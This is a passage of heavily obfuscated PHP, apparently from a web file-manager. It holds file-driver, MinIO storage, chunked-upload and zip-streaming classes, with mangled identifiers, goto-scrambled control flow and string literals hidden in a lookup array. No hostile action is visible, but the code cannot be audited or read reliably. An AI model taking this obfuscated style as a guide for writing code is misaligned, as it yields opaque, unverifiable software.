C¼µíÊÃ÷ø: if ($eîƒ‡©ÆŒ <= $cğ„ˆŸÑÕç * $eª±Ş Ğø) { return $this->hashMd5($Cíå§¤¹Ğˆ) . $eîƒ‡©ÆŒ; } $c±¯¶¦»Æ÷ = $EçÂöÏ‰ĞÃ[43]; $Cóø â†Ú¡ = intval($eîƒ‡©ÆŒ / $eª±Ş Ğø); goto f“ÂñòÂ‹ğ; f“ÂñòÂ‹ğ: $AÊ—ĞåÉÑ = fopen($Cíå§¤¹Ğˆ, $EçÂöÏ‰ĞÃ[1177]); if (!$AÊ—ĞåÉÑ) { return $c±¯¶¦»Æ÷; } for ($E½ ù·Óİ = 0; $E½ ù·Óİ < $eª±Ş Ğø; $E½ ù·Óİ++) { fseek($AÊ—ĞåÉÑ, $Cóø â†Ú¡ * $E½ ù·Óİ); $c±¯¶¦»Æ÷ .= fread($AÊ—ĞåÉÑ, $cğ„ˆŸÑÕç); } goto DóùÏĞ³æ‡; A¨Šõ î‘á: return md5($c±¯¶¦»Æ÷) . $eîƒ‡©ÆŒ; goto Aç¥‚Å¡†Æ; DóùÏĞ³æ‡: fseek($AÊ—ĞåÉÑ, $eîƒ‡©ÆŒ - $cğ„ˆŸÑÕç); $c±¯¶¦»Æ÷ .= fread($AÊ—ĞåÉÑ, $cğ„ˆŸÑÕç); fclose($AÊ—ĞåÉÑ); goto A¨Šõ î‘á; Aç¥‚Å¡†Æ: } public function getContent($fŞ•Ÿ„´ÑŞ) { $fŞ•Ÿ„´ÑŞ = $this->iconvSystem($fŞ•Ÿ„´ÑŞ); return file_get_contents($fŞ•Ÿ„´ÑŞ); } public function setContent($E—ÍÙ“ÛË«, $aÕùè´¤×¯ = '') { $E—ÍÙ“ÛË« = $this->iconvSystem($E—ÍÙ“ÛË«); @file_put_contents($E—ÍÙ“ÛË«, $aÕùè´¤×¯, LOCK_EX); clearstatcache(); return strlen($aÕùè´¤×¯) == filesize($E—ÍÙ“ÛË«); } public function fileSubstr($a´À»ŒÆ³, $B•¯ŞÎĞ¹ó = 0, $f¼ä½Â—ÛÍ = false) { goto E¼„©í¯ç­; a‰¶¿£™ˆÊ: return $D…İáÖÁ¹ä; goto dÃÂİØ˜Š; B… Šİ¿‚Ã: fseek($EÈù½ØÏÃ™, $B•¯ŞÎĞ¹ó); $D…İáÖÁ¹ä = fread($EÈù½ØÏÃ™, $f¼ä½Â—ÛÍ); fclose($EÈù½ØÏÃ™); goto a‰¶¿£™ˆÊ; FÄ¢Óğë»ô: if ($f¼ä½Â—ÛÍ <= 0) { return $B‰–è·’…”[43]; } $EÈù½ØÏÃ™ = fopen($a´À»ŒÆ³, $B‰–è·’…”[1177]); if (!$EÈù½ØÏÃ™) { return !1; } goto B… Šİ¿‚Ã; E¼„©í¯ç­: $B‰–è·’…” =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a´À»ŒÆ³ = $this->iconvSystem($a´À»ŒÆ³); if ($f¼ä½Â—ÛÍ === !1) { $f¼ä½Â—ÛÍ = $this->size($a´À»ŒÆ³); } goto FÄ¢Óğë»ô; dÃÂİØ˜Š: } public function upload($Bİï…„¥¿‰, $e÷İšŒ‡è£, $f¥î¬º›±’ = false, $Bƒéëõ«Úî = REPEAT_REPLACE) { $føÔ×£Ÿ = $this->copyFile($e÷İšŒ‡è£, $Bİï…„¥¿‰); return $føÔ×£Ÿ ? $this->getPathOuter($Bİï…„¥¿‰) : !1; } public function setModifyTime($FŠÙ°Ä’¡™, $BëõÒÏíå¶ = '') { @touch($FŠÙ°Ä’¡™, intval($BëõÒÏíå¶)); } public function download($aƒŒ‚š±Ô, $a¤ùøØóÙ) { return $this->iconvSystem($aƒŒ‚š±Ô); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($c‡‡‹ÏˆÌ) { parent::__construct($c‡‡‹ÏˆÌ); $this->signatureVersion($_SERVER[çŞáÓæÚô‚Ô‡][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto d ÙÁ°œÒõ; AøŸÙ”–‰µ: if (class_exists($_SERVER[çŞáÓæÚô‚Ô‡][1975])) { class Services_JSON_Error extends PEAR_Error { function __construct($FçæÍÛø«ª = "\x75\156\x6b\x6e\157\x77\156\x20\145\x72\162\157\162", $bÈ—Âº§¸Ò = null, $CÅŠÕİã = null, $Eæºì’ÄÒŒ = null, $A¡œÍİæ = null) { parent::PEAR_Error($FçæÍÛø«ª, $bÈ—Âº§¸Ò, $CÅŠÕİã, $Eæºì’ÄÒŒ, $A¡œÍİæ); } } } else { class Services_JSON_Error { function __construct($FŞç¡ÛÖÚ¿ = "\x75\156\x6b\156\x6f\x77\156\40\145\x72\162\157\x72", $E“ù”ë»Ñ = null, $cÊôÅë­ = null, $d Ñ¨•”ƒ® = null, $e¡†…ÉõŒ§ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto E¢¿²¾èİƒ; E¸£ùÅ§’¬: if (!empty($_FILES)) { $c÷¤Û–ö°Û = $_FILES[$e÷‡™®…Ä[177]]; $this->uploadFile = $c÷¤Û–ö°Û[$e÷‡™®…Ä[1976]]; if (!$this->uploadFile && $c÷¤Û–ö°Û[$e÷‡™®…Ä[1226]] > 0) { show_json($this->errorInfo($c÷¤Û–ö°Û[$e÷‡™®…Ä[1226]]), !1); } } else { if (isset($in[$e÷‡™®…Ä[395]])) { $this->uploadFile = isset($in[$e÷‡™®…Ä[1977]]) ? $e÷‡™®…Ä[1978] : $e÷‡™®…Ä[1821]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Aİò—Ş¡®æ; E¢¿²¾èİƒ: $e÷‡™®…Ä =& $_SERVER[çŞáÓæÚô‚Ô‡]; global $in; $this->in =& $in; goto E¸£ùÅ§’¬; Aİò—Ş¡®æ: $this->checkSize(); $this->tempPathInit(); goto d«¥÷¼¼êÏ; d«¥÷¼¼êÏ: } public function upload() { goto BÒÅŒ—á; BËÆêù­Œˆ: $c…¡Í‰‹‡µ = $Aî£•™²Ş * $f‹¢·Ëõò¯; $b›½Á‹ ‚ˆ = @fopen($this->tempFile, $C«Ğ—˜“¾ˆ[1986]); fseek($b›½Á‹ ‚ˆ, $c…¡Í‰‹‡µ); goto Aß„³Í…©; BÒÅŒ—á: $C«Ğ—˜“¾ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Aî£•™²Ş = isset($this->in[$C«Ğ—˜“¾ˆ[1979]]) ? intval($this->in[$C«Ğ—˜“¾ˆ[1979]]) : 0; $C¼Ùª¬Äõæ = isset($this->in[$C«Ğ—˜“¾ˆ[1980]]) ? intval($this->in[$C«Ğ—˜“¾ˆ[1980]]) : 1; goto d“¼áÄ«“ˆ; Aß„³Í…©: $Dô·áºö²Ç = $this->writeTo($Bì©âÈ°Áæ, $b›½Á‹ ‚ˆ, $this->tempFile); $F¢œ¿“½ğ½ = IO::hashSimple($Bì©âÈ°Áæ); $B‰±ßÏö»ñ = IO::size($Bì©âÈ°Áæ); goto FéÑÃš¿¸; E›¶»¿¤š›: CacheLock::lock($this->tempFile, 20); $eºì‚ìì±Û = $this->statusGet(); $this->initFileTemp(); goto cª¹ŞšÙ™ñ; FéÑÃš¿¸: @unlink($Bì©âÈ°Áæ); if (!$Dô·áºö²Ç) { $this->showJson($C«Ğ—˜“¾ˆ[1987] . $Aî£•™²Ş, !1); } $eºì‚ìì±Û[$C«Ğ—˜“¾ˆ[1988]] = $C¼Ùª¬Äõæ; goto CÀ…§êÀ’Î; BÕÛ’‰£ù: CacheLock::unlock($this->tempFile); return $this->tempFile; goto FÈµâô²¨; A¸±††Ä®: ignore_timeout(); if (!$this->checkChunkHash($eºì‚ìì±Û)) { $this->showJson($C«Ğ—˜“¾ˆ[1993], !1); } $this->statusSet(!1); goto BÕÛ’‰£ù; EÊ¦Ùí¥¯²: if ($C¼Ùª¬Äõæ > 1 && $f‹¢·Ëõò¯ <= 0) { show_json($C«Ğ—˜“¾ˆ[1983], !1); } if ($f‹¢·Ëõò¯ > $B‰±ßÏö»ñ) { $C¼Ùª¬Äõæ = 1; } if ($C¼Ùª¬Äõæ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto E›¶»¿¤š›; d“¼áÄ«“ˆ: $bãì³‰ÜÅ… = $this->tempFile . $C«Ğ—˜“¾ˆ[1981] . $Aî£•™²Ş; $B‰±ßÏö»ñ = isset($this->in[$C«Ğ—˜“¾ˆ[531]]) ? intval($this->in[$C«Ğ—˜“¾ˆ[531]]) : 0; $f‹¢·Ëõò¯ = isset($this->in[$C«Ğ—˜“¾ˆ[1982]]) ? intval($this->in[$C«Ğ—˜“¾ˆ[1982]]) : 0; goto EÊ¦Ùí¥¯²; cª¹ŞšÙ™ñ: $Bì©âÈ°Áæ = $this->moveUploadedFile($bãì³‰ÜÅ…); if ($B‰±ßÏö»ñ > 0 && filesize($Bì©âÈ°Áæ) == 0) { $this->showJson($C«Ğ—˜“¾ˆ[1984], !1); } if (!$Bì©âÈ°Áæ) { $this->showJson(LNG($C«Ğ—˜“¾ˆ[1985]), !1); } goto BËÆêù­Œˆ; CÀ…§êÀ’Î: $eºì‚ìì±Û[$C«Ğ—˜“¾ˆ[1989]][$C«Ğ—˜“¾ˆ[1990] . $Aî£•™²Ş] = array($C«Ğ—˜“¾ˆ[1991] => $c…¡Í‰‹‡µ, $C«Ğ—˜“¾ˆ[1043] => $Aî£•™²Ş, $C«Ğ—˜“¾ˆ[87] => $B‰±ßÏö»ñ, $C«Ğ—˜“¾ˆ[174] => $F¢œ¿“½ğ½); $this->statusSet($eºì‚ìì±Û); if (count($eºì‚ìì±Û[$C«Ğ—˜“¾ˆ[1989]]) != $eºì‚ìì±Û[$C«Ğ—˜“¾ˆ[1988]]) { $this->showJson($C«Ğ—˜“¾ˆ[1992] . $Aî£•™²Ş, !0); } goto A¸±††Ä®; FÈµâô²¨: } private function checkSize() { $b¦äÔÑĞö˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (phpBuild64() || $this->in[$b¦äÔÑĞö˜[87]] < PHP_INT_MAX) { return; } show_json(LNG($b¦äÔÑĞö˜[1994]), !1); } private function showJson($f¯ ”¥®¹, $F¼åÜ÷òÊ¹) { CacheLock::unlock($this->tempFile); if (!$F¼åÜ÷òÊ¹) { return show_json($f¯ ”¥®¹, $F¼åÜ÷òÊ¹); } show_json($f¯ ”¥®¹, $F¼åÜ÷òÊ¹); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto a–ç–†é¶•; aªïØìÚÏ¸: $this->tempFile = $däëåØ‘ôÃ . $B˜íÏîÁî[1997] . md5($c•œˆ×ôëŠ . $this->in[$B˜íÏîÁî[1538]]); goto CÃø÷ÖÈÜ; a–ç–†é¶•: $B˜íÏîÁî =& $_SERVER[çŞáÓæÚô‚Ô‡]; $däëåØ‘ôÃ = TEMP_FILES; @mk_dir($däëåØ‘ôÃ); goto E×å‡íÍİ; E×å‡íÍİ: touch($däëåØ‘ôÃ . $B˜íÏîÁî[1995]); $c•œˆ×ôëŠ = isset($this->in[$B˜íÏîÁî[1996]]) ? $this->in[$B˜íÏîÁî[1996]] : !1; if (strlen($c•œˆ×ôëŠ) < 30) { $c•œˆ×ôëŠ = md5(USER_ID . $this->in[$B˜íÏîÁî[85]] . $this->fileName . $this->in[$B˜íÏîÁî[87]]); } goto aªïØìÚÏ¸; CÃø÷ÖÈÜ: } private function moveUploadedFile($CğµÀ¤ŠåÂ) { $c¿ø¶ñ£ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÌŠ¡Ğ¨¢« = $this->uploadFile; if ($DÌŠ¡Ğ¨¢« == $c¿ø¶ñ£[1998]) { @file_put_contents($CğµÀ¤ŠåÂ, base64_decode($_REQUEST[$c¿ø¶ñ£[1999]])); } else { if ($DÌŠ¡Ğ¨¢« == $c¿ø¶ñ£[1821]) { $f ¤—ÊÍâ¥ = @fopen($CğµÀ¤ŠåÂ, $c¿ø¶ñ£[1528]); $this->writeTo($DÌŠ¡Ğ¨¢«, $f ¤—ÊÍâ¥, $CğµÀ¤ŠåÂ); } else { if (!move_uploaded_file($DÌŠ¡Ğ¨¢«, $CğµÀ¤ŠåÂ)) { return !1; } } } return $CğµÀ¤ŠåÂ; } private function writeTo($e¼ŞŞø¿, $A¹˜Â‘¤ã, $d´î¿Õ—ïã) { goto dÁ…š„Ùõå; d»ÛÆŸÛšÏ: $E¥áÂìÅ™Ì = @fopen($e¼ŞŞø¿, $e³¤´ À¤†[1527]); if (!$E¥áÂìÅ™Ì || !$A¹˜Â‘¤ã || !$c‘õÍš°¤—) { CacheLock::unlock($a çŒø×áÀ); return !1; } while (!feof($E¥áÂìÅ™Ì)) { fwrite($A¹˜Â‘¤ã, fread($E¥áÂìÅ™Ì, 1024 * 200)); } goto d¦ğËšŠ¡À; d¦ğËšŠ¡À: fclose($E¥áÂìÅ™Ì); fclose($A¹˜Â‘¤ã); CacheLock::unlock($a çŒø×áÀ); goto D×’ŠŒ½Ëğ; dÁ…š„Ùõå: $e³¤´ À¤† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a çŒø×áÀ = $e³¤´ À¤†[2000] . $d´î¿Õ—ïã; $c‘õÍš°¤— = CacheLock::lock($a çŒø×áÀ, 1); goto d»ÛÆŸÛšÏ; D×’ŠŒ½Ëğ: return !0; goto e¬¸ïÇ„ª×; e¬¸ïÇ„ª×: } private function statusGet() { goto e ÕÜ¬£à·; AàíÙñîÏ: if (!$this->statusData) { $A‡ëÕõ¸¡¶ = array($Aù¿ÆëÑó[38] => $this->fileName, $Aù¿ÆëÑó[1988] => 0, $Aù¿ÆëÑó[1989] => array()); $this->statusSet($A‡ëÕõ¸¡¶); } return $this->statusData; goto aÒ»œ¶¾Ø÷; e ÕÜ¬£à·: $Aù¿ÆëÑó =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_array($this->statusData)) { return $this->statusData; } $DÍ“·Õë = $this->tempFile . $Aù¿ÆëÑó[2001]; goto D©ñ‰½ãÆÉ; D©ñ‰½ãÆÉ: $aöóã–Šˆ = !1; if (file_exists($DÍ“·Õë)) { $aöóã–Šˆ = @file_get_contents($DÍ“·Õë); } if ($aöóã–Šˆ) { $this->statusData = json_decode($aöóã–Šˆ, !0); } goto AàíÙñîÏ; aÒ»œ¶¾Ø÷: } public function statusSet($a‡ÆÖÙ–) { $b–Ó”ç±§ = $this->tempFile . $_SERVER[çŞáÓæÚô‚Ô‡][2001]; if (!$a‡ÆÖÙ–) { if (file_exists($b–Ó”ç±§)) { @unlink($b–Ó”ç±§); } return !0; } $this->statusData = $a‡ÆÖÙ–; return file_put_contents($b–Ó”ç±§, json_encode($a‡ÆÖÙ–)); } private function initFileTemp() { $dĞŠõµšÁ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (file_exists($this->tempFile)) { return; } $e«ĞĞèĞšº = fopen($this->tempFile, $dĞŠõµšÁ[2002]); fseek($e«ĞĞèĞšº, $this->in[$dĞŠõµšÁ[87]] - 1, SEEK_SET); fwrite($e«ĞĞèĞšº, $dĞŠõµšÁ[479]); fclose($e«ĞĞèĞšº); } public function checkChunk() { goto aÃ— ¨ƒ£‘; aÃ— ¨ƒ£‘: $B£íÉÖ„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C÷êäãì¹ = array(); CacheLock::lock($this->tempFile); goto A§®ŞÓÇ»©; A§®ŞÓÇ»©: $D¸¬¢Ñšœ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($D¸¬¢Ñšœ[$B£íÉÖ„[1989]] as $D…ä ¦ø¿â) { $FÁ‘á š©ª = $D…ä ¦ø¿â[$B£íÉÖ„[174]]; if ($FÁ‘á š©ª) { $C÷êäãì¹[$B£íÉÖ„[2003] . $D…ä ¦ø¿â[$B£íÉÖ„[1043]]] = $FÁ‘á š©ª; } } goto aâµ…±¨ê·; aâµ…±¨ê·: return $C÷êäãì¹; goto aìÛ¾ñ¬è; aìÛ¾ñ¬è: } private function checkChunkHash($dö¨ÄÓë¤¦) { goto b¢å„™°; cî²øà˜ïÛ: return $a÷´¨¼áîó; goto d©×¹‰œÏ; b¢å„™°: $AæõİŠ§³¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (count($dö¨ÄÓë¤¦[$AæõİŠ§³¼[1989]]) != $dö¨ÄÓë¤¦[$AæõİŠ§³¼[1988]]) { return !1; } $CéºàÕ½ÆÒ = _get($this->in, $AæõİŠ§³¼[1996]); goto díáÃì ¦—; AïñÇ¸ƒí‚: $a÷´¨¼áîó = !0; foreach ($dö¨ÄÓë¤¦[$AæõİŠ§³¼[1989]] as $A Æ²÷¬à ) { fseek($d¬ó«›ˆÔß, $A Æ²÷¬à [$AæõİŠ§³¼[1991]]); $F©œİšæ×¥ = PathDriverStream::hash($d¬ó«›ˆÔß, $A Æ²÷¬à [$AæõİŠ§³¼[87]]); if ($A Æ²÷¬à [$AæõİŠ§³¼[174]] != $F©œİšæ×¥) { $a÷´¨¼áîó = !1; break; } } fclose($d¬ó«›ˆÔß); goto cî²øà˜ïÛ; díáÃì ¦—: $D‹Ïè‰ŸŞé = _get($this->in, $AæõİŠ§³¼[2004]); if (strlen($D‹Ïè‰ŸŞé) == 32 && IO::hashSimple($this->tempFile) == $CéºàÕ½ÆÒ && IO::hashMd5($this->tempFile) == $D‹Ïè‰ŸŞé) { return !0; } $d¬ó«›ˆÔß = fopen($this->tempFile, $AæõİŠ§³¼[1177]); goto AïñÇ¸ƒí‚; d©×¹‰œÏ: } public static function fileName() { goto eùÇÈ‰—‘‡; eùÇÈ‰—‘‡: $EšôäÖÑëğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; global $in; $D¦‚èä×± = isset($in[$EšôäÖÑëğ[38]]) ? $in[$EšôäÖÑëğ[38]] : $EšôäÖÑëğ[43]; goto a¾µÜŸ½Àƒ; FĞ¬±ìòØ: $bºöÒŠ—ì = $bºöÒŠ—ì ? $bºöÒŠ—ì : time(); $bŠ˜”ò‹·À = strtolower($D¦‚èä×±); if ($bŠ˜”ò‹·À == $EšôäÖÑëğ[2006] || $bŠ˜”ò‹·À == $EšôäÖÑëğ[2007]) { $D¦‚èä×± = date($EšôäÖÑëğ[699], $bºöÒŠ—ì) . $EšôäÖÑëğ[80] . $in[$EšôäÖÑëğ[87]] . $EšôäÖÑëğ[1635]; } else { if ($bŠ˜”ò‹·À == $EšôäÖÑëğ[2008]) { $D¦‚èä×± = date($EšôäÖÑëğ[699], $bºöÒŠ—ì) . $EšôäÖÑëğ[80] . $in[$EšôäÖÑëğ[87]] . $EšôäÖÑëğ[2009]; } } goto F¢ååìÌ¦Û; F¢ååìÌ¦Û: return KodIO::clear($D¦‚èä×±); goto b§§ç¦êí¹; a¾µÜŸ½Àƒ: if (!empty($_FILES)) { $D¦‚èä×± = $D¦‚èä×± ? $D¦‚èä×± : $_FILES[$EšôäÖÑëğ[177]][$EšôäÖÑëğ[395]]; } if (!is_wap()) { return KodIO::clear($D¦‚èä×±); } $bºöÒŠ—ì = strtotime($in[$EšôäÖÑëğ[2005]]); goto FĞ¬±ìòØ; b§§ç¦êí¹: } private function errorInfo($aë“õàÄ©) { $F¡ƒ‹øÏ‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aáËí«¬» = array($F¡ƒ‹øÏ‰[2010], $F¡ƒ‹øÏ‰[2011], $F¡ƒ‹øÏ‰[2012], $F¡ƒ‹øÏ‰[2013], $F¡ƒ‹øÏ‰[2014], $F¡ƒ‹øÏ‰[2015], $F¡ƒ‹øÏ‰[2016], $F¡ƒ‹øÏ‰[2017]); return $aë“õàÄ© . $F¡ƒ‹øÏ‰[4] . $aáËí«¬»[$aë“õàÄ©]; } } class ZipMake { const VERSION = "\x30\x2e\62\56\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($aŸºÕ§™¡Ñ = null) { $Dæ¹÷íõ°‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->outputStream = fopen($Dæ¹÷íõ°‰[2018], $Dæ¹÷íõ°‰[1233]); $this->outputName = $aŸºÕ§™¡Ñ; $this->needHeaders = !0; } public function addFile($DÃ’ÁÍªÅ…, $b‰†Û¬á””) { goto Cñ¹ìæ‹³; Fß¢¶³²ËÕ: $D‡ÇÑò¾¢® = $this->addFileHeader($DÃ’ÁÍªÅ…, $D÷±ÄöãåÇ); $B©Ó†ñá… = $cÄ†‚œŞ¶ = filesize($b‰†Û¬á””); $BƒŒÃ×Áİ† = fopen($b‰†Û¬á””, $d•´²œ§Ñ[2019]); goto e‡¼¬…™Şá; Cñ¹ìæ‹³: $d•´²œ§Ñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÃ’ÁÍªÅ… = $this->filterFilename($DÃ’ÁÍªÅ…); $D÷±ÄöãåÇ = static::METHOD_STORE; goto Fß¢¶³²ËÕ; e‡¼¬…™Şá: while (!feof($BƒŒÃ×Áİ†)) { $bá½Æ‘‘›² = fread($BƒŒÃ×Áİ†, 1048576); $this->send($bá½Æ‘‘›²); } fclose($BƒŒÃ×Áİ†); $BÈì¬¼ˆ = hexdec(hash_file($d•´²œ§Ñ[2020], $b‰†Û¬á””)); goto AÎŞ†æğˆ; AÎŞ†æğˆ: $this->addFileFooter($DÃ’ÁÍªÅ…, $D÷±ÄöãåÇ, $BÈì¬¼ˆ, $B©Ó†ñá…, $cÄ†‚œŞ¶, $D‡ÇÑò¾¢®); goto B‰ƒá¤óáƒ; B‰ƒá¤óáƒ: } public function addFileFromStream($B‚œ¬‚Ó—Ä, $Cñ†ò¤Ğç‘) { goto EÓø•’Â«„; DÏá×³Ñ‰Ä: $this->addFileFooter($B‚œ¬‚Ó—Ä, $A†Ñëê®è°, $dë‹ÚœŸ¡, $D»óÇñ¸Ãß, $aÑ–Õø¥»ø, $B¿Öæ™Â½İ); goto dšËÇ¥—µé; EÓø•’Â«„: $B‚œ¬‚Ó—Ä = $this->filterFilename($B‚œ¬‚Ó—Ä); $A†Ñëê®è° = static::METHOD_STORE; $B¿Öæ™Â½İ = $this->addFileHeader($B‚œ¬‚Ó—Ä, $A†Ñëê®è°); goto AÒŠ‘ù¯ã; AÒŠ‘ù¯ã: fseek($Cñ†ò¤Ğç‘, 0, SEEK_END); $D»óÇñ¸Ãß = $aÑ–Õø¥»ø = ftell($Cñ†ò¤Ğç‘); rewind($Cñ†ò¤Ğç‘); goto a“ø¦íë™š; a“ø¦íë™š: $fèğµŸñĞğ = hash_init($_SERVER[çŞáÓæÚô‚Ô‡][2020]); while (!feof($Cñ†ò¤Ğç‘)) { $a¦‚ˆˆ™Š› = fread($Cñ†ò¤Ğç‘, 1048576); hash_update($fèğµŸñĞğ, $a¦‚ˆˆ™Š›); $this->send($a¦‚ˆˆ™Š›); } $dë‹ÚœŸ¡ = hexdec(hash_final($fèğµŸñĞğ)); goto DÏá×³Ñ‰Ä; dšËÇ¥—µé: } public function finish() { foreach ($this->files as $A´‚¼ôÏóó) { $this->addCdrFile($A´‚¼ôÏóó); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($eºãÈç½‰, $D£½Œ¹™ùÖ) { goto fÈâŒÉ…ß¬; añ›ÙÔ…Êù: $FÀƒç·‹¢Ñ = $this->dosTime(time()); $c°™ïšÔ†ø = array(array($eÖ¦ÖÏÈÑÙ[2022], static::FILE_HEADER_SIGNATURE), array($eÖ¦ÖÏÈÑÙ[2023], static::ZIP_VERSION_64), array($eÖ¦ÖÏÈÑÙ[2023], 8), array($eÖ¦ÖÏÈÑÙ[2023], $D£½Œ¹™ùÖ), array($eÖ¦ÖÏÈÑÙ[2022], $FÀƒç·‹¢Ñ), array($eÖ¦ÖÏÈÑÙ[2022], 0), array($eÖ¦ÖÏÈÑÙ[2022], 4294967295), array($eÖ¦ÖÏÈÑÙ[2022], 4294967295), array($eÖ¦ÖÏÈÑÙ[2023], $a‹Ô‰Õ‘µ…), array($eÖ¦ÖÏÈÑÙ[2023], 32)); $D‚·šÅù¨‘ = array(array($eÖ¦ÖÏÈÑÙ[2023], 1), array($eÖ¦ÖÏÈÑÙ[2023], 28), array($eÖ¦ÖÏÈÑÙ[2024], 0), array($eÖ¦ÖÏÈÑÙ[2024], 0), array($eÖ¦ÖÏÈÑÙ[2024], 0), array($eÖ¦ÖÏÈÑÙ[2022], 0)); goto BíŠˆ§‹õ¿; a¬±ŸêÅ£ö: return strlen($aÍæ´ó†»í) + $a‹Ô‰Õ‘µ… + strlen($d¿ëåÓÑ•); goto e¡ÈÙï°±; BíŠˆ§‹õ¿: $aÍæ´ó†»í = $this->packFields($c°™ïšÔ†ø); $d¿ëåÓÑ• = $this->packFields($D‚·šÅù¨‘); $this->send($aÍæ´ó†»í . $eºãÈç½‰ . $d¿ëåÓÑ•); goto a¬±ŸêÅ£ö; fÈâŒÉ…ß¬: $eÖ¦ÖÏÈÑÙ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eºãÈç½‰ = preg_replace($eÖ¦ÖÏÈÑÙ[2021], $eÖ¦ÖÏÈÑÙ[43], $eºãÈç½‰); $a‹Ô‰Õ‘µ… = strlen($eºãÈç½‰); goto añ›ÙÔ…Êù; e¡ÈÙï°±: } protected function addFileFooter($AéÆÊó£, $fô¹œÀ§§, $F»ñÙ„‰Ñˆ, $fÎŠğÛâö, $CæÄ³ã³©¨, $dìø¤ê‚î) { $Eğó„å§‘â =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÕ²¹ŸŒ…Æ = array(array($Eğó„å§‘â[2022], static::DATA_DESCRIPTOR_SIGNATURE), array($Eğó„å§‘â[2022], $F»ñÙ„‰Ñˆ), array($Eğó„å§‘â[2024], $fÎŠğÛâö), array($Eğó„å§‘â[2024], $CæÄ³ã³©¨)); $Eó°ÑÄ­ƒã = $this->packFields($cÕ²¹ŸŒ…Æ); $this->send($Eó°ÑÄ­ƒã); $Bš˜Šù¾‰ = $dìø¤ê‚î + $fÎŠğÛâö + $B¶“‹Í†®Ö; $this->addToCdr($AéÆÊó£, $fô¹œÀ§§, $F»ñÙ„‰Ñˆ, $fÎŠğÛâö, $CæÄ³ã³©¨, $Bš˜Šù¾‰); } private function addToCdr($Aš¡­›œ», $F·¶Éó®àœ, $AŠš¯œ×Î‡, $c†í¬ÔÓŒ, $Bˆˆ™ˆÓ, $BŒÕéğµ£) { $this->files[] = array($Aš¡­›œ», $F·¶Éó®àœ, $AŠš¯œ×Î‡, $c†í¬ÔÓŒ, $Bˆˆ™ˆÓ, $this->ofs); $this->ofs += $BŒÕéğµ£; } protected function addCdrFile($FºÇ†¦á) { goto A¤‡¶øÉÓƒ; A¤‡¶øÉÓƒ: $aÖ’ÛÃ›İ¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; list($E†ø© “ç¡, $aÖÎµŒİ˜, $CÀøŞíÃïƒ, $dÒ÷ƒùåªÁ, $F×¢øÚÛ”, $bğ‚‰Óâ³) = $FºÇ†¦á; $cÚ¨í¶âÛÆ = $aÖ’ÛÃ›İ¯[43]; goto D‡Öœë¤šÎ; D‡Öœë¤šÎ: $b‡÷ªÑñ— = $this->dosTime(time()); $F£™ì–§ğ = array(array($aÖ’ÛÃ›İ¯[2022], static::CDR_FILE_SIGNATURE), array($aÖ’ÛÃ›İ¯[2023], static::ZIP_VERSION_64), array($aÖ’ÛÃ›İ¯[2023], static::ZIP_VERSION_64), array($aÖ’ÛÃ›İ¯[2023], 8), array($aÖ’ÛÃ›İ¯[2023], $aÖÎµŒİ˜), array($aÖ’ÛÃ›İ¯[2022], $b‡÷ªÑñ—), array($aÖ’ÛÃ›İ¯[2022], $CÀøŞíÃïƒ), array($aÖ’ÛÃ›İ¯[2022], 4294967295), array($aÖ’ÛÃ›İ¯[2022], 4294967295), array($aÖ’ÛÃ›İ¯[2023], strlen($E†ø© “ç¡)), array($aÖ’ÛÃ›İ¯[2023], 32), array($aÖ’ÛÃ›İ¯[2023], strlen($cÚ¨í¶âÛÆ)), array($aÖ’ÛÃ›İ¯[2023], 0), array($aÖ’ÛÃ›İ¯[2023], 0), array($aÖ’ÛÃ›İ¯[2022], 32), array($aÖ’ÛÃ›İ¯[2022], 4294967295)); $DØŒ•°¿Ù = array(array($aÖ’ÛÃ›İ¯[2023], 1), array($aÖ’ÛÃ›İ¯[2023], 28), array($aÖ’ÛÃ›İ¯[2024], $F×¢øÚÛ”), array($aÖ’ÛÃ›İ¯[2024], $dÒ÷ƒùåªÁ), array($aÖ’ÛÃ›İ¯[2024], $bğ‚‰Óâ³), array($aÖ’ÛÃ›İ¯[2022], 0)); goto D˜Å¼—ºšö; fîØ‡ƒ›¼Ğ: $this->send($c ´ÖùáÇ); $this->cdr_ofs += strlen($c ´ÖùáÇ); goto Dšº‚Ò½’; D˜Å¼—ºšö: $f»£°íÕî = $this->packFields($F£™ì–§ğ); $e¶‚ÏäçÔ‡ = $this->packFields($DØŒ•°¿Ù); $c ´ÖùáÇ = $f»£°íÕî . $E†ø© “ç¡ . $cÚ¨í¶âÛÆ . $e¶‚ÏäçÔ‡; goto fîØ‡ƒ›¼Ğ; Dšº‚Ò½’: } protected 